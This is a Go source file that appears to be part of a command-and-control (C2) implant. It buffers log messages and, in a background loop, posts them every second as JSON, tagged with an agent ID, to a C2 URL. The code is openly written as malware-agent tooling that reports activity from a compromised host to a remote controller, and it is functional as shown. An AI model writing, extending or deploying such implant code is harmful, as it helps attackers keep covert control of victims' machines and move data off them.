package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"sync"
	"time"
)

var (
	logBuffer []string
	logMutex  sync.Mutex
)

// Info prints to the local terminal AND buffers it for the C2
func Info(format string, a ...interface{}) {
	msg := fmt.Sprintf(format, a...)
	
	// Print to local terminal
	fmt.Println(msg)

	// Buffer for network post
	logMutex.Lock()
	logBuffer = append(logBuffer, msg)
	logMutex.Unlock()
}

type LogPayload struct {
	ID   string   `json:"id"`
	Logs []string `json:"logs"`
}

// FlushLogs runs as a goroutine alongside main
func FlushLogs(c2Url string) {
	for {
		logMutex.Lock()
		if len(logBuffer) > 0 {
			logsToSend := make([]string, len(logBuffer))
			copy(logsToSend, logBuffer)
			logBuffer = []string{} // clear buffer
			logMutex.Unlock()

			payload := LogPayload{
				ID:   AgentID,
				Logs: logsToSend,
			}
			
			data, err := json.Marshal(payload)
			if err == nil {
				client := http.Client{Timeout: 2 * time.Second}
				// We don't care about the response for logs
				client.Post(c2Url, "application/json", bytes.NewBuffer(data))
			}

		} else {
			logMutex.Unlock()
		}
		
		time.Sleep(1 * time.Second) // Check every second
	}
}
